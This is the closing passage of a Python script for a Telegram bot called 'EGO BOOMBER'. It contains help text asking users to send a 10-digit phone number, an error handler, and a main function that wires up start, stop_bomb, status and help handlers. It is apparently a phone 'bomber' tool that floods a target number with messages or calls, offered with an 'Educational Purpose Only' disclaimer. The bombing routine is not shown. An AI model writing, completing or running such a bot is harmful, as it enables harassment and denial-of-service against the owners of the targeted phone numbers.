            "/help - Show this help\n\n"
            "💡 Just send a 10-digit phone number to start!\n\n"
            "⚠️ For Educational Purpose Only\n"
            "👤 @BESTCHEAT_OWNER"
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

def main():
    print("Starting EGO BOOMBER Telegram Bot...")
    print("Created by: @BESTCHEAT_OWNER")
    print("Bot is running...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_bomb))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    # Run bot
    print("Bot is ready! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
